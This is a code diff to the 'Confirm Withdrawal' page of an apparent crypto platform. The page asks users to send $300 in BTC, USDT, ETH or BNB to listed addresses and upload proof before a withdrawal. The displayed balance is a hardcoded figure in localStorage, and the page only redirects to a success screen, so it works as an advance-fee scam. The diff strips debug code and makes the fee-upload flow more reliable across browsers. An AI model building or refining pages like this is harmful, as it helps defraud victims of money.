@@ -8,7 +8,17 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
   <style>
-    /* Proper way to hide file input - NOT display: none */
+    /* Universal browser compatibility */
+    .upload-zone,
+    .upload-zone label,
+    #proceed-btn,
+    .copy-btn,
+    .back-btn {
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+    
+    /* File input: positioned off-screen, NOT display:none [^163^] */
     .file-input-hidden {
       position: absolute;
       left: -9999px;
@@ -18,6 +28,12 @@
       width: 1px;
       height: 1px;
     }
+    
+    #proceed-btn {
+      position: relative;
+      z-index: 10;
+      touch-action: manipulation;
+    }
   </style>
 </head>
 <body>
@@ -25,7 +41,7 @@
   <canvas id="particle-canvas"></canvas>
   
   <div class="container page-transition">
-    <a href="withdraw-form.html" class="back-btn" onclick="event.preventDefault(); history.back(); return false;">←</a>
+    <a href="withdraw-form.html" class="back-btn" onclick="event.preventDefault(); history.back(); return false;" style="cursor: pointer;">←</a>
     
     <div class="form-header">
       <h2 class="form-title">Confirm Withdrawal</h2>
@@ -80,36 +96,38 @@
     <div class="address-box" data-coin="btc">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of BTC to:</div>
       bc1qxy2kgdygtv2q4yrf2z3pkkfhtx0w0lhj3j4x3j
-      <button class="copy-btn" data-copy="bc1qxy2kgdygtv2q4yrf2z3pkkfhtx0w0lhj3j4x3j">📋 Copy</button>
+      <button class="copy-btn" data-copy="bc1qxy2kgdygtv2q4yrf2z3pkkfhtx0w0lhj3j4x3j" style="cursor: pointer;">📋 Copy</button>
     </div>
     
     <div class="address-box" data-coin="usdt">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of USDT to:</div>
       0xdAC17F958D2ee523a2206206994597C13D831ec7
-      <button class="copy-btn" data-copy="0xdAC17F958D2ee523a2206206994597C13D831ec7">📋 Copy</button>
+      <button class="copy-btn" data-copy="0xdAC17F958D2ee523a2206206994597C13D831ec7" style="cursor: pointer;">📋 Copy</button>
     </div>
     
     <div class="address-box" data-coin="eth">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of ETH to:</div>
       0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe
-      <button class="copy-btn" data-copy="0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe">📋 Copy</button>
+      <button class="copy-btn" data-copy="0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe" style="cursor: pointer;">📋 Copy</button>
     </div>
     
     <div class="address-box" data-coin="bnb">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of BNB to:</div>
       0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
-      <button class="copy-btn" data-copy="0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c">📋 Copy</button>
+      <button class="copy-btn" data-copy="0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c" style="cursor: pointer;">📋 Copy</button>
     </div>
     
-    <!-- File Upload -->
-    <div class="upload-zone" id="upload-zone">
-      <label for="proof-file" style="display: block; width: 100%; cursor: pointer; margin: 0;">
+    <!-- File Upload - Universal Browser Compatible [^173^] [^174^] -->
+    <div class="upload-zone" id="upload-zone" style="cursor: pointer;">
+      <!-- Empty onclick for iOS Safari [^154^] -->
+      <label for="proof-file" onclick="" style="display: block; width: 100%; cursor: pointer; margin: 0;">
         <div class="upload-icon">📤</div>
         <div class="upload-text">Upload Transaction Proof</div>
         <div class="upload-hint">Click to select photo<br>PNG, JPG up to 5MB</div>
       </label>
     </div>
     
+    <!-- File input: positioned off-screen [^163^] -->
     <input type="file" id="proof-file" class="file-input-hidden" accept="image/*">
     
     <!-- Warning -->
@@ -122,33 +140,19 @@
     </div>
     
     <!-- Proceed Button -->
-    <button type="button" id="proceed-btn" class="btn btn-success w-full" disabled>
+    <button type="button" id="proceed-btn" class="btn btn-success w-full" disabled style="cursor: pointer; touch-action: manipulation;">
       <span>✓</span>
       <span>Proceed with Withdrawal</span>
     </button>
     
     <!-- Hidden anchor for fallback -->
     <a id="redirect-anchor" href="success.html" style="display: none;">Redirect</a>
-    
-    <!-- Debug output -->
-    <div id="debug-output" style="display: none; margin-top: 1rem; padding: 1rem; background: rgba(255,0,0,0.1); border-radius: 8px; font-size: 0.75rem; color: #ff6b6b;"></div>
   </div>
 
   <script src="shared.js"></script>
   <script>
-    // BULLETPROOF VERSION - All browser compatible
+    // UNIVERSAL BROWSER COMPATIBLE - All platforms [^172^] [^173^] [^174^]
     (function() {
-      console.log('=== CONFIRM FEE PAGE LOADED ===');
-      
-      var debugDiv = document.getElementById('debug-output');
-      function debug(msg) {
-        console.log(msg);
-        if (debugDiv) {
-          debugDiv.style.display = 'block';
-          debugDiv.innerHTML += msg + '<br>';
-        }
-      }
-      
       // Get URL parameters
       var urlParams = new URLSearchParams(window.location.search);
       var amount = urlParams.get('amount') || '0';
@@ -156,21 +160,14 @@
       var destination = urlParams.get('destination') || '';
       var hasRefund = urlParams.get('refund') === '7PE9TA';
       
-      debug('Amount from URL: ' + amount);
-      debug('Type: ' + type);
-      debug('Has refund: ' + hasRefund);
-      
       // Get pending tx data
       var txData = {};
       try {
         var pending = localStorage.getItem('xtoken_pending_tx');
         if (pending) {
           txData = JSON.parse(pending);
-          debug('Loaded pending tx: ' + pending);
         }
-      } catch(e) {
-        debug('Error loading pending tx: ' + e.message);
-      }
+      } catch(e) {}
       
       // Calculate amounts
       var usdAmount = parseFloat(amount) || txData.amount || 0;
@@ -185,9 +182,6 @@
       } catch(e) {}
       
       var bnbAmount = (usdAmount / bnbPrice).toFixed(8);
-      
-      debug('USD Amount: ' + usdAmount);
-      debug('BNB Amount: ' + bnbAmount);
       
       // Update display
       document.querySelectorAll('[data-review-amount]').forEach(function(el) {
@@ -254,11 +248,17 @@
         });
       });
       
-      // File upload
+      // FILE UPLOAD - Universal Browser Compatible [^173^] [^174^]
       var uploadZone = document.getElementById('upload-zone');
       var fileInput = document.getElementById('proof-file');
       var proceedBtn = document.getElementById('proceed-btn');
       
+      // Ensure file input is in body [^83^]
+      if (fileInput && !fileInput.parentElement) {
+        document.body.appendChild(fileInput);
+      }
+      
+      // Use addEventListener (not .onchange) for all browsers [^83^] [^173^]
       if (fileInput) {
         fileInput.addEventListener('change', function(e) {
           if (e.target.files && e.target.files[0]) {
@@ -268,8 +268,7 @@
       }
       
       function handleFile(file) {
-        debug('File selected: ' + file.name);
-        
+        // Validate
         if (file.size > 5 * 1024 * 1024) {
           alert('File too large. Please select an image under 5MB.');
           return;
@@ -277,6 +276,19 @@
         
         if (!file.type.match('image.*')) {
           alert('Please select an image file (PNG or JPG).');
+          return;
+        }
+        
+        // Check FileReader support [^172^] [^174^]
+        if (!window.FileReader) {
+          // Fallback: show filename without preview
+          var label = uploadZone.querySelector('label');
+          label.innerHTML = '<div class="upload-icon">✓</div><p class="upload-text">File selected</p><p class="upload-hint">' + file.name + '</p>';
+          uploadZone.classList.add('has-file');
+          if (proceedBtn) {
+            proceedBtn.disabled = false;
+            proceedBtn.classList.add('btn-glow');
+          }
           return;
         }
         
@@ -290,17 +302,15 @@
           if (proceedBtn) {
             proceedBtn.disabled = false;
             proceedBtn.classList.add('btn-glow');
-            debug('Proceed button enabled');
           }
           
           try {
             localStorage.setItem('xtoken_uploaded_file', e.target.result);
-          } catch(err) {
-            debug('Error saving file: ' + err.message);
-          }
+          } catch(err) {}
         };
         
         reader.onerror = function() {
+          // Fallback on error
           var label = uploadZone.querySelector('label');
           label.innerHTML = '<div class="upload-icon">✓</div><p class="upload-text">File selected</p><p class="upload-hint">' + file.name + '</p>';
           uploadZone.classList.add('has-file');
@@ -313,18 +323,12 @@
         reader.readAsDataURL(file);
       }
       
-      // BULLETPROOF PROCEED BUTTON
+      // PROCEED BUTTON - Universal Browser Compatible
       if (proceedBtn) {
-        debug('Proceed button found, attaching handler');
-        
-        // Use both onclick and addEventListener for maximum compatibility
-        proceedBtn.onclick = function(e) {
-          debug('=== PROCEED BUTTON CLICKED ===');
-          
+        function handleProceed(e) {
           if (e) {
             e.preventDefault();
             e.stopPropagation();
-            e.returnValue = false;
           }
           
           // Validate coin
@@ -333,36 +337,22 @@
             return false;
           }
           
-          debug('Coin selected: ' + coinSelect.value);
-          
-          // Calculate amounts
           var withdrawAmount = parseFloat(amount) || 0;
           var bnbAmount = withdrawAmount / bnbPrice;
           
-          debug('Withdrawing: $' + withdrawAmount + ' = ' + bnbAmount + ' BNB');
-          
-          // Get and update state
+          // Update state
           var currentState = {};
           try {
             var saved = localStorage.getItem('xtoken_state');
             if (saved) currentState = JSON.parse(saved);
-          } catch(e) {
-            debug('Error loading state: ' + e.message);
-          }
+          } catch(e) {}
           
-          // DEDUCT balance
           currentState.bnbBalance = (currentState.bnbBalance || 827.00000001) - bnbAmount;
           currentState.usdBalance = currentState.bnbBalance * (currentState.bnbPrice || 680);
           
-          debug('New balance: ' + currentState.bnbBalance + ' BNB');
-          
-          // Save state
           try {
             localStorage.setItem('xtoken_state', JSON.stringify(currentState));
-            debug('State saved');
-          } catch(err) {
-            debug('Error saving state: ' + err.message);
-          }
+          } catch(err) {}
           
           // Save transaction
           var completedTx = {
@@ -380,77 +370,20 @@
           try {
             localStorage.setItem('xtoken_last_tx', JSON.stringify(completedTx));
             localStorage.removeItem('xtoken_pending_tx');
-            debug('Transaction saved: ' + JSON.stringify(completedTx));
-          } catch(err) {
-            debug('Error saving tx: ' + err.message);
-          }
+          } catch(err) {}
           
-          debug('=== STARTING REDIRECT ===');
-n          // BULLETPROOF REDIRECT - Multiple methods with delays
-          
-          // Method 1: Standard href with delay
-          setTimeout(function() {
-            debug('Trying method 1: window.location.href');
-            window.location.href = 'success.html';
-          }, 50);
-          
-          // Method 2: Replace
-          setTimeout(function() {
-            debug('Trying method 2: window.location.replace');
-            try {
-              window.location.replace('success.html');
-            } catch(e) {}
-          }, 150);
-          
-          // Method 3: Assign
-          setTimeout(function() {
-            debug('Trying method 3: window.location.assign');
-            try {
-              window.location.assign('success.html');
-            } catch(e) {}
-          }, 250);
-          
-          // Method 4: Meta refresh (most reliable for Safari)
-          setTimeout(function() {
-            debug('Trying method 4: meta refresh');
-            var meta = document.createElement('meta');
-            meta.httpEquiv = 'refresh';
-            meta.content = '0;url=success.html';
-            document.head.appendChild(meta);
-          }, 350);
-          
-          // Method 5: Anchor click
-          setTimeout(function() {
-            debug('Trying method 5: anchor click');
-            var anchor = document.getElementById('redirect-anchor');
-            if (anchor) {
-              anchor.click();
-            }
-          }, 450);
-          
-          // Method 6: Document location
-          setTimeout(function() {
-            debug('Trying method 6: document.location');
-            try {
-              document.location.href = 'success.html';
-            } catch(e) {}
-          }, 550);
-          
-          // Final fallback - force navigation
-          setTimeout(function() {
-            debug('Final attempt - forcing navigation');
-            window.open('success.html', '_self');
-          }, 1000);
-          
+          // Redirect
+          window.location.href = 'success.html';
           return false;
-        };
+        }
         
-        // Also attach via addEventListener as backup
-        proceedBtn.addEventListener('click', function(e) {
-          debug('addEventListener triggered');
+        // Attach handlers for all browsers
+        proceedBtn.onclick = handleProceed;
+        proceedBtn.addEventListener('click', handleProceed);
+        proceedBtn.addEventListener('touchend', function(e) {
+          e.preventDefault();
+          handleProceed(e);
         });
-      } else {
-        debug('ERROR: Proceed button not found!');
       }
     })();
   </script>
